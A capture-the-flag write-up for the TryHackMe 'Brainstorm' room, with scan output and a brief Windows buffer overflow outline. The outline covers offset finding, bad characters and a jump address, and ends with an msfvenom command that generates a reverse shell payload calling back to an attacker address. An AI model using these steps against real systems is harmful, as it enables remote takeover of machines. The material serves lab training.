# Link
- https://tryhackme.com/room/brainstorm

# Info

## IP = $IP

# Ports

## Port Scanning
```bash
PORT     STATE SERVICE       REASON
21/tcp   open  ftp           syn-ack
3389/tcp open  ms-wbt-server syn-ack
9999/tcp open  abyss         syn-ack
```

## 21
- anonymous login
- cannot list directory....
```bash
wget -m --no-passive ftp://anonymous:anonymous@$IP
```

## 9999

### Port Analysing
``` bash
PORT     STATE SERVICE VERSION
9999/tcp open  abyss?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     Welcome to Brainstorm chat (beta)
|     Please enter your username (max 20 characters): Write a message:
|   NULL: 
|     Welcome to Brainstorm chat (beta)
|_    Please enter your username (max 20 characters):
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.93%I=7%D=3/25%Time=6601E97B%P=x86_64-pc-linux-gnu%r(NU
SF:LL,52,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter
SF:\x20your\x20username\x20\(max\x2020\x20characters\):\x20")%r(GetRequest
SF:,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x
SF:20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\x20mes
SF:sage:\x20")%r(HTTPOptions,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(
SF:beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20character
SF:s\):\x20Write\x20a\x20message:\x20")%r(FourOhFourRequest,63,"Welcome\x2
SF:0to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20usern
SF:ame\x20\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(J
SF:avaRMI,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20e
SF:nter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\
SF:x20message:\x20")%r(GenericLines,63,"Welcome\x20to\x20Brainstorm\x20cha
SF:t\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20ch
SF:aracters\):\x20Write\x20a\x20message:\x20")%r(RTSPRequest,63,"Welcome\x
SF:20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20user
SF:name\x20\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(
SF:RPCCheck,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x2
SF:0enter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20
SF:a\x20message:\x20")%r(DNSVersionBindReqTCP,63,"Welcome\x20to\x20Brainst
SF:orm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x
SF:2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(DNSStatusReques
SF:tTCP,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20ent
SF:er\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\x2
SF:0message:\x20")%r(Help,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(bet
SF:a\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20characters\)
SF::\x20Write\x20a\x20message:\x20")%r(SSLSessionReq,63,"Welcome\x20to\x20
SF:Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20
SF:\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(Terminal
SF:ServerCookie,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPleas
SF:e\x20enter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write
SF:\x20a\x20message:\x20");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Server 2008 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 or 2008 Beta 3 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 9999/tcp)
HOP RTT       ADDRESS
1   209.77 ms $IP
2   ... 3
4   337.45 ms $IP

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 198.15 seconds
```



# BufferOverflow

1. find max string: 2012
2. find EIP: 
    - `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5200`
    - `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 31704330`
3. checking EIP: `offset * "A" + "BBBB"`
4. find bad chars: `bytearray(range(1,256))`
5. find jump point: _625014DF_
6. rev shell: `msfvenom -p windows/shell_reverse_tcp LHOST=$ATK_IP LPORT=1234 -b "\x00" -f c`